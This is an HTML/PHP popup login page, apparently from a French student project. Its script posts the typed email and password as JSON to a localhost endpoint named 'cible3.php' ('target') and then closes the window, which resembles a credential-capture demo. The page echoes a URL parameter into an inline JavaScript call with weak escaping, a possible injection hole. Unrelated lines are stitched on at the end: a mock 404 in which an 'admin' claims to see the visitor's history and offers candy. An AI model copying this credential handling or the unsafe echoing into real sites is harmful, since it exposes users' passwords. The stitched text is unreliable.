<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8" />
        <title>Titre</title>
        <SCRIPT LANGUAGE="javascript">
        
		function check(url , json) {
			$.post(url, json)
			.done(function(datas) { 
				if(datas['Message'] !== undefined)
					alert(datas['Message']);
				if(datas['error'] !== undefined)
					alert(datas['error']);  
			})
			.fail(function(datas) { 
				alert(datas['error']); 
			})
			;}

		function jsonData(token) {
			var token_ext = token ;
			var _urlLog = 'http://localhost/projetFU/Communication/cible3.php?action=MAJ-login&token_ext='+token_ext;
			var login = document.getElementById("email");
			var password = document.getElementById("pass");
			var log = login.value;
			var pass = password.value;
			if (log && pass){
				var jsonLog = {email: log ,password: pass};
				var postLog = JSON.stringify(jsonLog);
				var logJSON = {log:postLog};
				check(_urlLog, logJSON);
				//$.post(_urlLog,logJSON);
				//$(this).dialog('destroy');
				window.close();
			}
		}
		</SCRIPT>

    </head>
 
    <body>
	   <form method="post">
	   <p>
	   		<?php 
				$token_ext = isset($_GET['token_ext']) ? htmlspecialchars($_GET['token_ext']) : null;
			?>

	       <label for="email">Votre email :</label>
	       <input type="text" name="email" id="email" />
	        
	       <br />
	       <label for="pass">Votre mot de passe :</label>
	       <input type="password" name="pass" id="pass" />

	       <br />
	       <input type="submit" value="Envoyer" onClick="jsonData('<?php  echo $token_ext; ?> ')"/>
	   </p>
		</form>
    </body>
</html>




erreur 404 
humain, c'est l'admin qui te parle
je sais tout je vois tt, même ton historique
alors arrete de jouer avec l'url

zone non autorizé

tu t'es perdu ??? suis-moi j'ai plein de bonbons....